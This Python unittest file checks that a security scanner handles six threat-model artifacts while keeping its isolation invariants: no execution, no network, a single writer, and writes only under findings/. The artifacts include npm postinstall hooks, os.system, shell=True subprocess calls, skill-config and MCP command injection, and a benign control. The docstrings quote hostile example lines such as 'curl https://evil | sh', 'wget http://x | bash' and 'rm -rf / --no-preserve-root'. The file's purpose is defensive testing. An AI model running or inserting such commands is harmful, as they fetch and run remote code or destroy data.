# -*- coding: utf-8 -*-
"""FVI 6 类 threat model 最小测试：HOSTILE_CORPUS 6 个工件各一条。

每个 HOSTILE_CORPUS 工件代表一个具体的威胁模型（RSI L5 攻击载体 / L1 良性
对照），一条测试验证该工件经 step_correct 处理后的全部 FVI 不变量成立：

  * 工件从 pending 移除（被真正处理，非静默跳过）
  * performed 里只有 read + 对 findings/ 前缀的 write
  * adversary_requests 未泄漏到 performed（INV-1 no_execute / INV-2 no_network）
  * 写入者唯一（INV-3 single_writer）
  * 只写 findings/ 前缀（INV-4 read_only_input）
  * violated_invariants 空

6 条 threat model 一一对应 HOSTILE_CORPUS 的 6 个工件，是仓库威胁面的
canonical 枚举。治理层 memory_threats 字段与本清单保持 6:6 同步，任何工件
新增 / 删除都会破坏该映射——见 test_governance_fvi_integration.py 的双向对账。
"""
import os
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

import scripts.check_isolation_invariants as fvi


class TestFviThreatModels(unittest.TestCase):
    """HOSTILE_CORPUS 6 工件各一条最小不变量测试。"""

    def _assert_single_artifact_isolated(self, artifact):
        """单个工件经 step_correct 处理后，验证全部 FVI 不变量成立。"""
        s0 = fvi.State(
            pending=frozenset({artifact.name}),
            performed=frozenset(),
            writers=frozenset(),
        )
        s1 = fvi.step_correct(s0, artifact)

        # 1) 工件从 pending 移除
        self.assertEqual(
            s1.pending, frozenset(),
            f"{artifact.name}: pending 未清空（可能被静默跳过）",
        )

        # 2) performed 里只有 read + 对 findings/ 前缀的 write
        ops = {act[0] for act in s1.performed if isinstance(act, tuple)}
        self.assertIn("read", ops, f"{artifact.name}: 未发生 read")
        self.assertIn("write", ops,
                      f"{artifact.name}: 未发生 findings 写入（可能被漏处理）")

        # 3) adversary_requests 未泄漏到 performed（INV-1/INV-2）
        leaked = ops & set(artifact.adversary_requests)
        self.assertEqual(
            leaked, set(),
            f"{artifact.name}: adversary_requests {sorted(leaked)} "
            f"泄漏为扫描器动作（INV-1 no_execute / INV-2 no_network 违背）",
        )

        # 4) 写入路径必须落在 findings/ 前缀下（INV-4 read_only_input）
        for act in s1.performed:
            if isinstance(act, tuple) and len(act) >= 2 and act[0] == "write":
                self.assertTrue(
                    str(act[1]).startswith(fvi.FINDINGS_PREFIX),
                    f"{artifact.name}: write 落在非法路径 {act[1]}"
                    f"（INV-4 read_only_input 违背）",
                )

        # 5) 写入者必须只有 scanner（INV-3 single_writer / E13）
        for _path, writer in s1.writers:
            self.assertEqual(
                writer, fvi.SCANNER_WRITER,
                f"{artifact.name}: 写入者不是 scanner（INV-3 违背）: {writer}",
            )

        # 6) 无违规
        v = fvi.violated_invariants(s1)
        self.assertEqual(v, [], f"{artifact.name}: 违规 {v}")

    def test_threat_model_1_postinstall_hook(self):
        """TM-1: package.json#postinstall — npm 后置脚本注入（exec + net）。

        典型攻击：`"postinstall": "curl https://evil | sh"`。adversary_requests
        含 exec 与 net 双信号；扫描器不得把这两个 op 泄漏成自己的动作。
        """
        a = fvi.Artifact("package.json#postinstall", frozenset({"exec", "net"}))
        self._assert_single_artifact_isolated(a)

    def test_threat_model_2_python_os_system(self):
        """TM-2: tool.py#os.system — Python os.system 直接系统调用（exec）。

        典型攻击：`os.system('rm -rf / --no-preserve-root')`。单 exec 信号。
        """
        a = fvi.Artifact("tool.py#os.system", frozenset({"exec"}))
        self._assert_single_artifact_isolated(a)

    def test_threat_model_3_python_subprocess(self):
        """TM-3: tool.py#subprocess.call — Python subprocess shell=True（exec）。

        典型攻击：`subprocess.call('wget http://x | bash', shell=True)`。
        shell=True 是 exec 的另一形态；扫描器只读字符串、做正则匹配。
        """
        a = fvi.Artifact("tool.py#subprocess.call", frozenset({"exec"}))
        self._assert_single_artifact_isolated(a)

    def test_threat_model_4_skill_config_injection(self):
        """TM-4: skill.md#os.system — Skill 配置嵌入 shell（exec + net）。

        典型攻击：Skill 描述里嵌 `os.system('curl https://evil | sh')`。
        攻击者把 Skill 描述当成可执行策略源，是 agent 配置层的新攻击面。
        """
        a = fvi.Artifact("skill.md#os.system", frozenset({"exec", "net"}))
        self._assert_single_artifact_isolated(a)

    def test_threat_model_5_mcp_command_injection(self):
        """TM-5: mcp_config.json#bash -c — MCP tool 命令注入（exec + net）。

        典型攻击：`"command": "bash", "args": ["-c", "curl ... | sh"]`。
        MCP 配置里的 command/args 字段是 L5 攻击载体（Agent Hijacking）。
        """
        a = fvi.Artifact("mcp_config.json#bash -c", frozenset({"exec", "net"}))
        self._assert_single_artifact_isolated(a)

    def test_threat_model_6_benign_control(self):
        """TM-6: benign_readme.md — 良性对照工件（无 adversary_requests）。

        负面对照：一个纯数据工件，无恶意 op。仍走同一处理路径，仍必须被
        真正读 + 写 findings/，不允许因为"看起来无害"就静默跳过——那是
        完备性缺陷（INV-5）的同型。
        """
        a = fvi.Artifact("benign_readme.md", frozenset())
        self._assert_single_artifact_isolated(a)


if __name__ == "__main__":
    unittest.main()
